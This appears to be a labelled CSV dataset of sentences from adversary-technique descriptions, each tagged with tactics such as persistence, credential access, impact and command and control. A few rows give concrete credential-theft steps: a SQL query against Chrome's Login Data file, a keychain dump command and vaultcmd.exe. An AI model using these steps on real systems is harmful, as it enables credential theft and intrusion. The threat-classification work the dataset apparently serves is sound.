"Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Kexts are loaded and unloaded through kextload and kextunload commands.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Developers without these privileges may still sign kexts but they will not load unless SIP is disabled.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"If SIP is enabled, the kext signature is verified before being added to the AuxKC.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"However, kexts are still allowed as ""Legacy System Extensions"" since there is no System Extension for Kernel Programming Interfaces.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries can use LKMs and kexts to conduct [Persistence] and/or [Privilege Escalation] on a system.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Examples have been found in the wild, and there are some relevant open source projects as well.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems.,PERSISTENCE,PRIVILEGE_ESCALATION,,
The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain.,PERSISTENCE,PRIVILEGE_ESCALATION,,
The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may target LSASS drivers to obtain persistence.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow]), an adversary can use LSA operations to continuously execute malicious payloads.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may add login items to execute upon user login to gain persistence or escalate privileges.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in., whereas the Service Management Framework uses the API call SMLoginItemSetEnabled.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Login items installed using the Service Management Framework leverage launchd, are not visible in the System Preferences, and can only be removed by the application that created them.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries can utilize [AppleScript] and [Native API] calls to create a login item to spawn malicious executables.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation.,PERSISTENCE,PRIVILEGE_ESCALATION,,
A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"The Registry key contains entries for the following:



* Local Port

* Standard TCP/IP Port

* WSD Port.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup.,PERSISTENCE,PRIVILEGE_ESCALATION,,
A print processor can be installed through the AddPrintProcessor API call with an account that has SeLoadDriverPrivilege enabled.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Alternatively, a print processor can be registered to the print spooler service by adding the HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver Registry key that points to the DLL.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the GetPrintProcessorDirectory API call.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may modify plist files to automatically run an application when a user logs in.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to ""Reopen windows when logging back in"".",PERSISTENCE,PRIVILEGE_ESCALATION,,
Applications listed in this file are automatically reopened upon the user’s next logon.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries can establish [Persistence] by adding a malicious application path to the com.apple.loginwindow.[UUID].plist file to execute payloads when a user logs in.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Placing a program within a startup folder will also cause that program to execute when a user logs in.,PERSISTENCE,PRIVILEGE_ESCALATION,,
There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.,PERSISTENCE,PRIVILEGE_ESCALATION,,

"An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may create or edit shortcuts to run a program during system boot or user login.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries could use shortcuts to execute their tools for persistence.,PERSISTENCE,PRIVILEGE_ESCALATION,,
They may create a new shortcut as a means of indirection that may use [Masquerading] to look like a legitimate program.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may abuse time providers to execute DLLs when the system boots.,PERSISTENCE,PRIVILEGE_ESCALATION,,
The Windows Time service (W32Time) enables time synchronization across and within domains.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider.",PERSISTENCE,PRIVILEGE_ESCALATION,,

Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Registry entries in HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\ and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are used to manage additional helper programs and functionalities that support Winlogon.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Specifically, the following subkeys have been known to be possibly vulnerable to abuse: 
* Winlogon\Notify - points to notification package DLLs that handle Winlogon events

* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may modify XDG autostart entries to execute programs or commands during system boot.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Linux desktop environments that are XDG compliant implement functionality for XDG autostart entries.,PERSISTENCE,PRIVILEGE_ESCALATION,,
These entries will allow an application to automatically start during the startup of a desktop environment after user logon.,PERSISTENCE,PRIVILEGE_ESCALATION,,

Adversaries may also use [Masquerading] to make XDG autostart entries look as if they are associated with legitimate programs.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.",PERSISTENCE,PRIVILEGE_ESCALATION,,
These scripts can vary based on operating system and whether applied locally or remotely.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may use a Login Hook to establish persistence executed upon user logon.,PERSISTENCE,PRIVILEGE_ESCALATION,,
A login hook is a plist file that points to a specific script to execute with root privileges upon user logon.,PERSISTENCE,PRIVILEGE_ESCALATION,,
The plist file is located in the /Library/Preferences/com.apple.loginwindow.plist file and can be modified using the defaults command-line utility.,PERSISTENCE,PRIVILEGE_ESCALATION,,
This behavior is the same for logout hooks where a script can be executed upon user logout.,PERSISTENCE,PRIVILEGE_ESCALATION,,
All hooks require administrator permissions to modify or create hooks.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Adversaries can add or insert a path to a malicious script in the com.apple.loginwindow.plist file, using the LoginHook or LogoutHook key-value pair.",PERSISTENCE,PRIVILEGE_ESCALATION,,

There can be only one login and logout hook on a system at a time.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Windows allows logon scripts to be run whenever a specific user or group of users log into a system.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Network logon scripts can be assigned using Active Directory or Group Policy Objects.,PERSISTENCE,PRIVILEGE_ESCALATION,,
These logon scripts run with the privileges of the user they are assigned to.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may use these scripts to maintain persistence on a network.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup.,PERSISTENCE,PRIVILEGE_ESCALATION,,
These files allow system administrators to map and start custom services at startup for different run levels.,PERSISTENCE,PRIVILEGE_ESCALATION,,
RC scripts require root privileges to modify.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Adversaries can establish persistence by adding a malicious binary path or shell commands to rc.local, rc.common, and other RC scripts specific to the Unix-like distribution.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Upon reboot, the system executes the script's contents as root, resulting in persistence.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts.,PERSISTENCE,PRIVILEGE_ESCALATION,,
This is now a deprecated mechanism in macOS in favor of [Launchd].,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may use startup items automatically executed at boot initialization to establish persistence.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"This is technically a deprecated technology (superseded by [Launch Daemon]), and thus the appropriate folder, /Library/StartupItems isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"A startup item is a directory whose executable and configuration property list (plist), StartupParameters.plist, reside in the top-level directory.",PERSISTENCE,PRIVILEGE_ESCALATION,,
An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may enumerate browser bookmarks to learn more about compromised hosts.,DISCOVERY,,,
"Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.",DISCOVERY,,,
"Browser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files] associated with logins cached by a browser.",DISCOVERY,,,
"Specific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.",DISCOVERY,,,
Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers.,PERSISTENCE,,,
They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.,PERSISTENCE,,,
Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.,PERSISTENCE,,,
"Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.",PERSISTENCE,,,
"Previous to macOS 11, adversaries could silently install browser extensions via the command line using the profiles tool to install malicious .mobileconfig files.",PERSISTENCE,,,
"In macOS 11+, the use of the profiles tool can no longer install configuration profiles, however .mobileconfig files can be planted and installed with user interaction.",PERSISTENCE,,,
"Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.",PERSISTENCE,,,
There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.,PERSISTENCE,,,
"A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.",COLLECTION,,,
"Executing browser-based behaviors such as pivoting may require specific process permissions, such as SeDebugPrivilege and/or high-integrity/administrator rights.",COLLECTION,,,
Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic.,COLLECTION,,,
"This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed.",COLLECTION,,,
Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly.,COLLECTION,,,
"With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint] or webmail, that is accessible through the browser and which the browser has sufficient permissions.",COLLECTION,,,
Browser pivoting may also bypass security provided by 2-factor authentication.,COLLECTION,,,
Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.,CREDENTIAL_ACCESS,,,
"Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.",CREDENTIAL_ACCESS,,,
Brute forcing credentials may take place at various points during a breach.,CREDENTIAL_ACCESS,,,
"For example, adversaries may attempt to brute force access to [Valid Accounts] within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping], [Account Discovery], or [Password Policy Discovery].",CREDENTIAL_ACCESS,,,
Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services] as part of Initial Access.,CREDENTIAL_ACCESS,,,
Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap.,CREDENTIAL_ACCESS,,,
"Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed.",CREDENTIAL_ACCESS,,,
The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.,CREDENTIAL_ACCESS,,,
"Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.",CREDENTIAL_ACCESS,,,
"Typically, management services over commonly used ports are used when stuffing credentials.",CREDENTIAL_ACCESS,,,
"Commonly targeted services include the following:



* SSH (22/TCP)

* Telnet (23/TCP)

* FTP (21/TCP)

* NetBIOS / SMB / Samba (139/TCP & 445/TCP)

* LDAP (389/TCP)

* Kerberos (88/TCP)

* RDP / Terminal Services (3389/TCP)

* HTTP/HTTP Management Services (80/TCP & 443/TCP)

* Oracle (1521/TCP)

* MySQL (3306/TCP)

* VNC (5900/TCP).",CREDENTIAL_ACCESS,,,
"In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.",CREDENTIAL_ACCESS,,,
"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping] can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash] is not an option.",CREDENTIAL_ACCESS,,,
"Further, adversaries may leverage [Data from Configuration Repository] in order to obtain hashed credentials for network devices.",CREDENTIAL_ACCESS,,,
"Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes.",CREDENTIAL_ACCESS,,,

There are also specific applications that store passwords to make it easier for users manage and maintain.,CREDENTIAL_ACCESS,,,
"Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",CREDENTIAL_ACCESS,,,
Adversaries may acquire credentials from web browsers by reading files specific to the target browser.,CREDENTIAL_ACCESS,,,
Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.,CREDENTIAL_ACCESS,,,
"Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.",CREDENTIAL_ACCESS,,,
"For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, AppData\Local\Google\Chrome\User Data\Default\Login Data and executing a SQL query: SELECT action_url, username_value, password_value FROM logins;.",CREDENTIAL_ACCESS,,,
"The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function CryptUnprotectData, which uses the victim’s cached logon credentials as the decryption key.",CREDENTIAL_ACCESS,,,
"Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc..",CREDENTIAL_ACCESS,,,
Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.,CREDENTIAL_ACCESS,,,
"After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access.",CREDENTIAL_ACCESS,,,
This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).,CREDENTIAL_ACCESS,,,
Adversaries may acquire credentials from Keychain.,CREDENTIAL_ACCESS,,,
"Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes.",CREDENTIAL_ACCESS,,,
"There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain.",CREDENTIAL_ACCESS,,,
"The default Keychain is the Login Keychain, which stores user passwords and information.",CREDENTIAL_ACCESS,,,
"The System Keychain stores items accessed by the operating system, such as items shared among users on a host.",CREDENTIAL_ACCESS,,,
The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service.,CREDENTIAL_ACCESS,,,
Keychains can be viewed and edited through the Keychain Access application or using the command-line utility security.,CREDENTIAL_ACCESS,,,
"Keychain files are located in ~/Library/Keychains/, /Library/Keychains/, and /Network/Library/Keychains/.",CREDENTIAL_ACCESS,,,
Adversaries may gather user credentials from Keychain storage/memory.,CREDENTIAL_ACCESS,,,
"For example, the command security dump-keychain –d will dump all Login Keychain credentials from ~/Library/Keychains/login.keychain-db.",CREDENTIAL_ACCESS,,,
Adversaries may also directly read Login Keychain credentials from the ~/Library/Keychains/login.keychain file.,CREDENTIAL_ACCESS,,,
"Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.",CREDENTIAL_ACCESS,,,
Adversaries may acquire user credentials from third-party password managers.,CREDENTIAL_ACCESS,,,
"Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.

 Adversaries may also try brute forcing via [Password Guessing] to obtain the master password of a password manager.",CREDENTIAL_ACCESS,,,
"An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain.",CREDENTIAL_ACCESS,,,
"This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.",CREDENTIAL_ACCESS,,,
"In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.",CREDENTIAL_ACCESS,,,
Adversaries may acquire credentials from the Windows Credential Manager.,CREDENTIAL_ACCESS,,,
"The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).",CREDENTIAL_ACCESS,,,
The Windows Credential Manager separates website credentials from application or network credentials in two lockers.,CREDENTIAL_ACCESS,,,
"As part of [Credentials from Web Browsers], Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker.",CREDENTIAL_ACCESS,,,
Application and network credentials are stored in the Windows Credentials locker.,CREDENTIAL_ACCESS,,,
"Credential Lockers store credentials in encrypted .vcrd files, located under %Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\.",CREDENTIAL_ACCESS,,,
"The encryption key can be found in a file named Policy.vpol, typically located in the same folder as the credentials.",CREDENTIAL_ACCESS,,,
Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. vaultcmd.exe is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface.,CREDENTIAL_ACCESS,,,
Adversaries may gather credentials by reading files located inside of the Credential Lockers.,CREDENTIAL_ACCESS,,,
Adversaries may also abuse Windows APIs such as CredEnumerateA to list credentials managed by the Credential Manager.,CREDENTIAL_ACCESS,,,
Adversaries may use password recovery tools to obtain plain text passwords from the Credential Manager.,CREDENTIAL_ACCESS,,,
Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.,IMPACT,,,
"To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts], [OS Credential Dumping], and [SMB/Windows Admin Shares]..",IMPACT,,,
"In cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.",IMPACT,,,
Adversaries may encode data to make the content of command and control traffic more difficult to detect.,COMMAND_AND_CONTROL,,,
Command and control (C2) information can be encoded using a standard data encoding system.,COMMAND_AND_CONTROL,,,
"Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.",COMMAND_AND_CONTROL,,,

Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications.,COMMAND_AND_CONTROL,,,
"Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.",COMMAND_AND_CONTROL,,,
They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key.,IMPACT,,,
This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.,IMPACT,,,
"In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers).",IMPACT,,,
"Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification] or [System Shutdown/Reboot], in order to unlock and/or gain access to manipulate these files.",IMPACT,,,
"To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts], [OS Credential Dumping], and [SMB/Windows Admin Shares].",IMPACT,,,

"Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.",IMPACT,,,
"By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.",IMPACT,,,
The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary.,IMPACT,,,
"For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",IMPACT,,,
"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.",IMPACT,,,
"By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.",IMPACT,,,
Adversaries may also conduct [Change Default File Association] and [Masquerading] to cause a similar effect.,IMPACT,,,
"By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.",IMPACT,,,
"Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats.",IMPACT,,,

Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information.,IMPACT,,,
The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary.,IMPACT,,,
Adversaries may obfuscate command and control traffic to make it more difficult to detect.,COMMAND_AND_CONTROL,,,
Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen.,COMMAND_AND_CONTROL,,,
"This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.",COMMAND_AND_CONTROL,,,
Adversaries may add junk data to protocols used for command and control to make detection more difficult.,COMMAND_AND_CONTROL,,,
"By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic.",COMMAND_AND_CONTROL,,,
Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.,COMMAND_AND_CONTROL,,,
"By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.",COMMAND_AND_CONTROL,,,
Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult.,COMMAND_AND_CONTROL,,,
Steganographic techniques can be used to hide data in digital messages that are transferred between systems.,COMMAND_AND_CONTROL,,,
This hidden information can be used for command and control of compromised systems.,COMMAND_AND_CONTROL,,,
"In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",COMMAND_AND_CONTROL,,,
Adversaries may stage collected data in a central location or directory prior to Exfiltration.,COLLECTION,,,
Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data].,COLLECTION,,,
"Interactive command shells may be used, and common functionality within [cmd] and bash may be used to copy data into a staging location.",COLLECTION,,,
"In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration.",COLLECTION,,,
An adversary may [Create Cloud Instance] and stage data in that instance.,COLLECTION,,,
Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.,COLLECTION,,,
Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration.,COLLECTION,,,
"Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",COLLECTION,,,
Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration.,COLLECTION,,,
"By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",COLLECTION,,,
This approach may be used to avoid triggering network data transfer threshold alerts.,EXFILTRATION,,,
"Many cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage.",COLLECTION,,,
These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application.,COLLECTION,,,
Data from these solutions can be retrieved directly using the cloud provider's APIs.,COLLECTION,,,
Solution providers typically offer security guides to help end users configure systems.,COLLECTION,,,
Misconfiguration by end users is a common problem.,COLLECTION,,,
"There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information.",COLLECTION,,,
"Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.",COLLECTION,,,
"Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems.",COLLECTION,,,
Configuration repositories may also facilitate remote access and administration of devices.,COLLECTION,,,
Adversaries may target these repositories in order to collect large quantities of sensitive system administration data.,COLLECTION,,,
"Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.",COLLECTION,,,
Adversaries may access network configuration files to collect sensitive data about the device and the network.,COLLECTION,,,
The network configuration is a file containing parameters that determine the operation of the device.,COLLECTION,,,
"The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset.",COLLECTION,,,
"Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.",COLLECTION,,,
"Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.",COLLECTION,,,
These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.,COLLECTION,,,
Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).,COLLECTION,,,
The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID).,COLLECTION,,,
"Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables.",COLLECTION,,,
"SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages.",COLLECTION,,,
"The MIB may also contain device operational information, including running configuration, routing table, and interface details.",COLLECTION,,,
Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.,COLLECTION,,,
Adversaries may leverage information repositories to mine valuable information.,COLLECTION,,,
